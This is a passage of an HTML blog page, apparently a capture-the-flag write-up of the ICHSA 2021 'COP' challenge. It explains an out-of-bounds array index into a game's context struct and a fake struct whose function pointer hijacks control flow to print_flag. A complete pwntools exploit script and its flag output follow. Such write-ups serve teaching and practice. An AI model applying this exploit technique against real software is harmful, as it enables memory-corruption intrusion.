+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>game_ctx</span><span class=o>-&gt;</span><span class=n>array_of_plays</span> <span class=o>=</span> <span class=n>mmap</span><span class=p>(</span><span class=n>ARRAY_OF_PLAYS_ID</span><span class=p>,</span> <span class=n>PAGE_SIZE</span><span class=p>,</span> <span class=n>PROT_WRITE</span> <span class=o>|</span> <span class=n>PROT_READ</span> <span class=p>,</span> <span class=n>MAP_PRIVATE</span> <span class=o>|</span> <span class=n>MAP_ANONYMOUS</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>...</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>The end result is that <code>((void*)game_ctx->array_of_plays)+0xd000 == (void*)game_ctx</code>, meaning that a sufficiently high value of <code>game_ctx->current_play</code> in <code>game_ctx->array_of_plays[game_ctx->current_play];</code> will pull data from <code>game_ctx</code>. In particular, we&rsquo;ll want to index all the way to <code>game_ctx->player_name[]</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define PLAYER_NAME_SIZE 1024
+</span></span></span><span class=line><span class=cl><span class=cp></span><span class=k>struct</span> <span class=n>game_ctx_t</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>user_points</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>pc_points</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=nl>current_play</span> <span class=p>:</span> <span class=mi>12</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=nl>ascii_art_enabled</span> <span class=p>:</span> <span class=mi>2</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>player_name</span><span class=p>[</span><span class=n>PLAYER_NAME_SIZE</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>play</span> <span class=o>*</span> <span class=n>array_of_plays</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>};</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>player_name[]</code> is user-controllable as a result of <code>change_user_name()</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>bool</span> <span class=nf>change_user_name</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=p>....</span>
+</span></span><span class=line><span class=cl>    <span class=c1>//Get user input
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span><span class=p>(</span><span class=nb>NULL</span> <span class=o>==</span> <span class=n>fgets</span><span class=p>(</span><span class=n>game_ctx</span><span class=o>-&gt;</span><span class=n>player_name</span><span class=p>,</span> <span class=n>PLAYER_NAME_SIZE</span><span class=p>,</span> <span class=n>stdin</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>        <span class=n>SET_STATUS_TO_FALSE_AND_BREAK</span><span class=p>(</span><span class=n>status</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>....</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Getting an arbitrary <code>struct play current_play</code> is now an implementation problem. We&rsquo;ll start by earning 5 points:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>5</span><span class=p>):</span> <span class=n>win_round</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>Then we&rsquo;ll increment <code>game_ctx->current_play</code> to an <em>appropriate</em> value, based on <code>sizeof(struct play) == 24</code> and <code>game_ctx->player_name == game_ctx->array_of_plays+0xd018</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>skip</span><span class=p>(</span><span class=n>n</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>choose</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;[  ]</span><span class=se>\b\b\b</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>n</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>OFFSET_TO_NAME</span> <span class=o>=</span> <span class=mh>0xd018</span>
+</span></span><span class=line><span class=cl><span class=n>SIZEOF_PLAY</span> <span class=o>=</span> <span class=mi>24</span>
+</span></span><span class=line><span class=cl><span class=k>while</span> <span class=n>current_play</span> <span class=o>&lt;</span> <span class=n>OFFSET_TO_NAME</span><span class=o>//</span><span class=n>SIZEOF_PLAY</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>toskip</span> <span class=o>=</span> <span class=nb>min</span><span class=p>([</span><span class=mi>255</span><span class=p>,</span> <span class=p>(</span><span class=n>OFFSET_TO_NAME</span><span class=o>-</span><span class=n>current_play</span><span class=o>*</span><span class=n>SIZEOF_PLAY</span><span class=p>)</span><span class=o>//</span><span class=n>SIZEOF_PLAY</span><span class=o>+</span><span class=mi>1</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>    <span class=n>current_play</span> <span class=o>+=</span> <span class=n>toskip</span>
+</span></span><span class=line><span class=cl>    <span class=n>skip</span><span class=p>(</span><span class=n>toskip</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>We&rsquo;ll follow that up by inserting the desired fake <code>struct play</code> inside <code>player_name</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>choose</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span> <span class=c1># change username</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;new username: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>fakeplay</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>10</span> <span class=o>+</span> <span class=n>pack</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;print_flag&#39;</span><span class=p>]</span><span class=o>+</span><span class=mh>0x66</span><span class=p>)</span> <span class=o>+</span> <span class=n>pack</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># no idea where the b&#39;a&#39;+10 comes from.</span>
+</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;struct play { //sizeof 24
+</span></span></span><span class=line><span class=cl><span class=s1>    uint32_t id = 1;
+</span></span></span><span class=line><span class=cl><span class=s1>    void (* animation_function)(enum handsigns, enum handsigns) = print_flag+0x66;
+</span></span></span><span class=line><span class=cl><span class=s1>    enum handsigns handsign = 1;
+</span></span></span><span class=line><span class=cl><span class=s1>};&#39;&#39;&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=n>current_play</span><span class=o>*</span><span class=n>SIZEOF_PLAY</span><span class=o>-</span><span class=n>OFFSET_TO_NAME</span><span class=p>)</span><span class=o>+</span><span class=n>fakeplay</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>Over here, the fake <code>play</code> structure has <code>animation_function</code> set to <code>print_flag+0x66</code>. The <code>+0x66</code> is there to bypass the <code>POINTS_TO_PRINT_FLAG</code> check in <code>print_flag()</code>.</p><p>With <code>->current_play</code> and <code>->player_name</code> in check, we only need to call <code>current_play->animation_function</code> to win.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>        <span class=c1>// if ascii art enabled, call function ptr
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span><span class=p>(</span><span class=n>game_ctx</span><span class=o>-&gt;</span><span class=n>ascii_art_enabled</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=n>current_play</span><span class=p>.</span><span class=n>animation_function</span><span class=p>(</span><span class=n>current_play</span><span class=p>.</span><span class=n>handsign</span><span class=p>,</span> <span class=n>handsig_input</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>To get to this part of the code, we only need to</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>choose</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span> <span class=c1># enable ascii art</span>
+</span></span><span class=line><span class=cl><span class=n>choose</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=c1># start the next round</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;[ ]</span><span class=se>\b\b</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span> <span class=c1># pick any option</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvall</span><span class=p>())</span> <span class=c1># get flag</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Opening</span> <span class=n>connection</span> <span class=n>to</span> <span class=n>cop</span><span class=o>.</span><span class=n>ichsa</span><span class=o>.</span><span class=n>ctf</span><span class=o>.</span><span class=n>today</span> <span class=n>on</span> <span class=n>port</span> <span class=mi>8011</span><span class=p>:</span> <span class=n>Done</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Receiving</span> <span class=nb>all</span> <span class=n>data</span><span class=p>:</span> <span class=n>Done</span> <span class=p>(</span><span class=mi>151</span><span class=n>B</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Closed</span> <span class=n>connection</span> <span class=n>to</span> <span class=n>cop</span><span class=o>.</span><span class=n>ichsa</span><span class=o>.</span><span class=n>ctf</span><span class=o>.</span><span class=n>today</span> <span class=n>port</span> <span class=mi>8011</span>
+</span></span><span class=line><span class=cl><span class=sa>b</span><span class=s1>&#39;| Computer chosed: 1</span><span class=se>\n</span><span class=s1>| You chosed: 1</span><span class=se>\n</span><span class=s1>| It is a tie</span><span class=se>\n</span><span class=s1>| Point goes to: no one</span><span class=se>\n</span><span class=s1>| The flag is:ICHSA_CTF</span><span class=si>{exploitation_with_cop_is_why_better_than_any_crime}</span><span class=se>\n</span><span class=s1>&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=full-script>Full script</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=s1>&#39;game&#39;</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ctypes</span> <span class=kn>import</span> <span class=n>CDLL</span>
+</span></span><span class=line><span class=cl><span class=n>clib</span> <span class=o>=</span> <span class=n>CDLL</span><span class=p>(</span><span class=s1>&#39;libc.so.6&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>clib</span><span class=o>.</span><span class=n>srand</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>ARRAY_OF_PLAYS_MAXSIZE</span> <span class=o>=</span> <span class=mi>170</span>
+</span></span><span class=line><span class=cl><span class=n>array_of_plays</span> <span class=o>=</span> <span class=p>[</span><span class=n>clib</span><span class=o>.</span><span class=n>rand</span><span class=p>()</span><span class=o>%</span><span class=mi>3</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>ARRAY_OF_PLAYS_MAXSIZE</span><span class=p>)]</span>
+</span></span><span class=line><span class=cl><span class=n>current_play</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;cop.ichsa.ctf.today&#39;</span><span class=p>,</span> <span class=mi>8011</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>choose</span><span class=p>(</span><span class=n>opt</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;[ ]</span><span class=se>\b\b</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>opt</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>win_round</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>current_play</span>
+</span></span><span class=line><span class=cl>    <span class=n>choose</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;[ ]</span><span class=se>\b\b</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>cpu_play</span> <span class=o>=</span> <span class=n>array_of_plays</span><span class=p>[</span><span class=n>current_play</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>current_play</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=n>user_play</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>:</span><span class=mi>1</span><span class=p>,</span> <span class=mi>1</span><span class=p>:</span><span class=mi>2</span><span class=p>,</span> <span class=mi>2</span><span class=p>:</span><span class=mi>0</span><span class=p>}[</span><span class=n>cpu_play</span><span class=p>]</span><span class=o>+</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>user_play</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>skip</span><span class=p>(</span><span class=n>n</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>choose</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;[  ]</span><span class=se>\b\b\b</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>n</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>5</span><span class=p>):</span> <span class=n>win_round</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>OFFSET_TO_NAME</span> <span class=o>=</span> <span class=mh>0xd018</span>
+</span></span><span class=line><span class=cl><span class=n>SIZEOF_PLAY</span> <span class=o>=</span> <span class=mi>24</span>
+</span></span><span class=line><span class=cl><span class=k>while</span> <span class=n>current_play</span> <span class=o>&lt;</span> <span class=n>OFFSET_TO_NAME</span><span class=o>//</span><span class=n>SIZEOF_PLAY</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>toskip</span> <span class=o>=</span> <span class=nb>min</span><span class=p>([</span><span class=mi>255</span><span class=p>,</span> <span class=p>(</span><span class=n>OFFSET_TO_NAME</span><span class=o>-</span><span class=n>current_play</span><span class=o>*</span><span class=n>SIZEOF_PLAY</span><span class=p>)</span><span class=o>//</span><span class=n>SIZEOF_PLAY</span><span class=o>+</span><span class=mi>1</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>    <span class=n>current_play</span> <span class=o>+=</span> <span class=n>toskip</span>
+</span></span><span class=line><span class=cl>    <span class=n>skip</span><span class=p>(</span><span class=n>toskip</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>choose</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span> <span class=c1># change username</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;new username: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>fakeplay</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>10</span> <span class=o>+</span> <span class=n>pack</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;print_flag&#39;</span><span class=p>]</span><span class=o>+</span><span class=mh>0x66</span><span class=p>)</span> <span class=o>+</span> <span class=n>pack</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=n>current_play</span><span class=o>*</span><span class=n>SIZEOF_PLAY</span><span class=o>-</span><span class=n>OFFSET_TO_NAME</span><span class=p>)</span><span class=o>+</span><span class=n>fakeplay</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>choose</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span> <span class=c1># enable ascii art</span>
+</span></span><span class=line><span class=cl><span class=n>choose</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=c1># win</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;[ ]</span><span class=se>\b\b</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvall</span><span class=p>())</span>
+</span></span></code></pre></td></tr></table></div></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on August 20, 2022&nbsp;<a class=git-hash href=https://github.com/152334H/blog/commit/9043fe81da576b575f9034af7e5c6056f051ba22 target=_blank title="commit by 152334H(54623771+152334H@users.noreply.github.com) 9043fe81da576b575f9034af7e5c6056f051ba22: Content push">
+<i class="fas fa-hashtag fa-fw" aria-hidden=true></i>9043fe8</a></span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Twitter" data-sharer=twitter data-url=https://152334H.github.io/blog/icsha-2021-cop/ data-title="ICHSA 2021: COP" data-hashtags=pwn,writeup><i class="fab fa-twitter fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Facebook" data-sharer=facebook data-url=https://152334H.github.io/blog/icsha-2021-cop/ data-hashtag=pwn><i class="fab fa-facebook-square fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Linkedin" data-sharer=linkedin data-url=https://152334H.github.io/blog/icsha-2021-cop/><i class="fab fa-linkedin fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=https://152334H.github.io/blog/icsha-2021-cop/ data-title="ICHSA 2021: COP"><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Reddit" data-sharer=reddit data-url=https://152334H.github.io/blog/icsha-2021-cop/><i class="fab fa-reddit fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=https://152334H.github.io/blog/icsha-2021-cop/ data-title="ICHSA 2021: COP"><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="Share on 微博" data-sharer=weibo data-url=https://152334H.github.io/blog/icsha-2021-cop/ data-title="ICHSA 2021: COP"><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/pwn/>pwn</a>,&nbsp;<a href=/tags/writeup/>writeup</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/blog/redpwn-2021-panda-food/ class=next rel=next title="C++ Smart Pointer UAFs: redpwn 2021's panda-food">C++ Smart Pointer UAFs: redpwn 2021's panda-food<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div><div id=comments><div id=giscus class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://giscus.app>Giscus</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=https://152334H.github.io/ target=_blank>152334H</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/twemoji@14.0.2/dist/twemoji.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:10},comment:{giscus:{category:"Announcements",categoryId:"DIC_kwDOH03r284CQ2Tu",darkTheme:"dark_dimmed",emitMetadata:"0",inputPosition:"bottom",lang:"en",lazyLoading:!1,lightTheme:"light",mapping:"pathname",reactionsEnabled:"1",repo:"152334H/blog",repoId:"R_kgDOH03r2w"}},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"},twemoji:!0}</script><script type=text/javascript src=/js/theme.min.js></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-W0STJ4D3N3",{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=G-W0STJ4D3N3" async></script></body></html>
